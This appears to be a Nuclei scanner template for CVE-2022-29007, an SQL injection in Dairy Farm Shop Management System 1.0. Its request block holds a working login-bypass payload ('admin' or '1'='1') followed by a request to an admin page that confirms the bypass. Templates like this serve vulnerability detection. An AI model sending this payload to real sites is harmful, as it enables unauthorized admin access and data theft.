id: CVE-2022-29007
info:
  name: Dairy Farm Shop Management System 1.0 - SQL Injection
  author: TenBird
  severity: critical
  description: The Dairy Farm Shop Management System 1.0 is vulnerable to SQL injection
    via the Admin panel, potentially allowing attackers to extract data, alter records,
    and perform unauthorized administrative actions on the affected site.
  reference:
  - https://www.exploit-db.com/exploits/50365
  - https://phpgurukul.com/dairy-farm-shop-management-system-using-php-and-mysql/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-29007
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-29007
    cwe-id: CWE-89
  metadata:
    verified: 'true'
    impact: The SQL injection vulnerabilities in Dairy Farm Shop Management System
      1.0 can allow an attacker to access sensitive data, alter information and perform
      unauthorized administrative actions, leading to significant impact on the affected
      site.
    recommendation: It is recommended that Dairy Farm Shop Management System 1.0 be
      updated to prevent SQL injection vulnerabilities and protect against unauthorized
      access to sensitive data.
  tags: cve,cve2022,sqli,auth-bypass,edb
requests:
- raw:
  - 'POST /dfsms/index.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    username=admin'' or ''1''=''1&password=1&login=login

    '
  - 'GET /dfsms/add-category.php HTTP/1.1

    Host: {{Hostname}}

    '
  cookie-reuse: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - <title>Add Product</title>
    - <span>Admin
    - DFSMS
    condition: and
  - type: status
    status:
    - 200
